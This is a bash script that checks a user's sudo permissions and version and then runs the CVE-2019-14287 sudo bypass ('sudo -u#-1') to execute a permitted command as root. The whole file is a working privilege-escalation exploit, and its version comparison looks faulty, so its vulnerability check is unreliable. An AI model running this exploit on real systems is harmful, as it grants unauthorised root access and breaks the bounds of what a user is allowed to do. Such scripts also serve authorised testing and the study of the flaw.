#!/bin/bash
sudo -l | \grep -e 'ALL.:.ALL' >>/dev/null 2>&1

if [[ $? -eq 0 ]]
then
	echo '>> The user has ALL sudo permissions.'
	echo '>> Hence,you should try using other user with lesser privileges.'
else
	# if user has sudo rights, but no ALL permission
	sudo -l >>/dev/null 2>&1
	if [[ $? -eq 1 ]]
	then
		echo '>> This user has no sudo rights!'
	else
		# set var with program which user can use
		SudoPerm=$(sudo -l | \grep '(' | cut -d/ -f2-)
		echo '>> The user has sudo rights.'
		echo '>> Checking the current version of sudo.'
		# set var with current sudo version to verify vulnerability
		SudoVer=$(sudo --version | \grep -i 'sudo version' | awk '{print $3}' | sed 's/\./,/g' | cut -c -6)
		if ((  $SudoVer < '1,8,28' ))
		then
			echo '>> The sudo version seems vulnerable to CVE-2019-14287'
			echo '>> Testing the Exploit:'
					if [[ $SudoPerm == *"ALL"* ]];
					then
						echo "Printing user and group information for the username:-";sudo -u#-1 id
					else
						sudo -u#-1 /$SudoPerm
					fi

		else
			echo 'The sudo version Doesnt seems vulnerable to CVE-2019-14287'

		fi
	fi
fi

echo ""
